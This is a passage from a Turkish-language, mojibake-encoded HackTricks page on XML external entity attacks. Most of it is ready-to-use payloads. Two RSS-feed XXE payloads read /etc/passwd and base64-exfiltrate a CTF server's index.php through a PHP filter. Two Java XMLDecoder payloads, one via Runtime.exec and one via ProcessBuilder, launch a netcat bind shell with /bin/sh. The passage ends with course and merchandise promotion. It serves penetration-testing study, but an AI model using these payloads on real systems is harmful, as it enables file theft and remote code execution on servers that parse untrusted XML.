Hedef sistem bu XML dÃ¶kÃ¼manÄ±nÄ± iÅŸlerken, `xxe` entity'sini `file:///etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸiyle deÄŸiÅŸtirir ve sonuÃ§ olarak `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini size dÃ¶ner.

Bu saldÄ±rÄ± tekniÄŸi, hedef sistemin hassas bilgilerini elde etmek iÃ§in kullanÄ±labilir. Ancak, bazÄ± hedef sistemler XXE saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in Ã¶nlemler alÄ±r. Bu nedenle, saldÄ±rÄ± yapmadan Ã¶nce hedef sistemin bu tÃ¼r bir saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek Ã¶nemlidir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Kaynak kodunu oku

PHP base64 filtresi kullanarak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder, bir XML mesajÄ±na dayalÄ± olarak nesneler oluÅŸturan bir Java sÄ±nÄ±fÄ±dÄ±r. KÃ¶tÃ¼ niyetli bir kullanÄ±cÄ±, bir uygulamanÄ±n **readObject** yÃ¶ntemine keyfi veri kullanmasÄ±nÄ± saÄŸlayabilirse, sunucuda anÄ±nda kod yÃ¼rÃ¼tme yetkisi elde eder.

### Runtime().exec() KullanÄ±mÄ±
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder, bir iÅŸlem oluÅŸturmak ve yÃ¼rÃ¼tmek iÃ§in kullanÄ±lan bir sÄ±nÄ±ftÄ±r. Bu sÄ±nÄ±f, harici bir iÅŸlemi baÅŸlatmak iÃ§in kullanÄ±labilir ve iÅŸlemle etkileÅŸimde bulunmak iÃ§in gerekli olan giriÅŸ ve Ã§Ä±kÄ±ÅŸ akÄ±ÅŸlarÄ±nÄ± yÃ¶netir.

ProcessBuilder, bir komut veya komut dosyasÄ± adÄ± ve gerekli argÃ¼manlarla birlikte bir iÅŸlem oluÅŸturmak iÃ§in kullanÄ±lÄ±r. ArdÄ±ndan, iÅŸlemi baÅŸlatmak iÃ§in `start()` yÃ¶ntemi Ã§aÄŸrÄ±lÄ±r.

Ä°ÅŸlem baÅŸlatÄ±ldÄ±ÄŸÄ±nda, iÅŸlemle etkileÅŸimde bulunmak iÃ§in `Process` sÄ±nÄ±fÄ±nÄ±n yÃ¶ntemlerini kullanabilirsiniz. Ã–rneÄŸin, iÅŸlemi sonlandÄ±rmak iÃ§in `destroy()` yÃ¶ntemini kullanabilir veya iÅŸlem Ã§Ä±ktÄ±sÄ±nÄ± almak iÃ§in `getInputStream()` veya `getErrorStream()` yÃ¶ntemlerini kullanabilirsiniz.

ProcessBuilder, bir iÅŸlemi baÅŸlatmak iÃ§in kullanÄ±lan gÃ¼venli bir yÃ¶ntemdir. Ancak, kÃ¶tÃ¼ niyetli kullanÄ±cÄ±lar tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±labilir. Ã–zellikle, dÄ±ÅŸarÄ±dan gelen verileri iÅŸlem argÃ¼manlarÄ± olarak kullanÄ±rken dikkatli olmak Ã¶nemlidir. KÃ¶tÃ¼ niyetli kullanÄ±cÄ±lar, XML dÄ±ÅŸ etkileÅŸimli varlÄ±klarÄ±nÄ± (XXE) kullanarak hassas verileri sÄ±zdÄ±rabilir veya sistemdeki dosyalarÄ± okuyabilirler.

Bu nedenle, gÃ¼venlik aÃ§Ä±sÄ±ndan, dÄ±ÅŸarÄ±dan gelen verileri iÅŸlem argÃ¼manlarÄ± olarak kullanÄ±rken dikkatli olmalÄ± ve gerekirse giriÅŸleri doÄŸrulamalÄ± veya sÄ±nÄ±rlamalÄ±yÄ±z. AyrÄ±ca, gÃ¼venlik duvarlarÄ± ve filtreler gibi ek Ã¶nlemler almak da Ã¶nemlidir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## AraÃ§lar

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referanslar

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Kendi harici DTD kullanarak HTTP Ã¼zerinden bilgi Ã§Ä±karma: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
